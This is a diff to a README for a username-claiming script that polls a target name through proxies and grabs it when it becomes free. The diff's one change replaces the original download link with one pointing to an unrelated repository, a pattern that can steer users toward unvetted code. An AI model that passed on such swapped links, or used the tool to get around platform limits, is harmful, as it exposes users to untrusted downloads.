@@ -11,7 +11,7 @@ A Python script that claims a username by repeatedly checking until it becomes a
 - Repeatedly checks a target username and claims when available
 
 ## Usage
-1. Download the [ZIP File](https://github.com/qxxa/instaclaimer/archive/refs/heads/main.zip) and extract the ZIP
+1. Download the [ZIP File](https://github.com/ziddi-shop/Instagram_Swapper.git) and extract the ZIP
 2. Use the command `pip install -r requirements.txt` to install the dependencies.
 3. If you are using proxies, add them to the `proxies.txt` in the `protocol:username:password:ip:port` format.
 4. run `main.py` 
